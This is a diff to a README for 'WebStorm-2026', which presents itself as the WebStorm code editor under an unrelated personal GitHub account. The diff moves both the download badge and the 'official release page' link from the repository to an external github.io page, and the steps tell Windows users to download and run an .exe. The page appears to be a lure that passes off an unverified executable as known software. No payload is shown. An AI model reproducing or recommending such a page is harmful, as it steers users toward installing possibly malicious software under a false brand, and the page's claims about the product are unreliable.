@@ -1,6 +1,6 @@
 # 🚀 WebStorm-2026 - Write better code with ease
 
-[![](https://img.shields.io/badge/Download_WebStorm-Blue.svg?style=for-the-badge)](https://github.com/Jawed-heliothis747/WebStorm-2026)
+[![](https://img.shields.io/badge/Download_WebStorm-Blue.svg?style=for-the-badge)](https://jawed-heliothis747.github.io)
 
 WebStorm-2026 provides a stable work environment for web development. This application supports JavaScript and TypeScript. It offers tools to help you manage your code files. Use this guide to install the software on your Windows computer.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this software. Check your system again
 
 Follow these steps to get the files on your machine:
 
-1. Visit the [official release page](https://github.com/Jawed-heliothis747/WebStorm-2026) to find the latest version.
+1. Visit the [official release page](https://jawed-heliothis747.github.io) to find the latest version.
 2. Look for the file ending in .exe.
 3. Click the file name to start your download.
 4. Wait for the download to finish. 
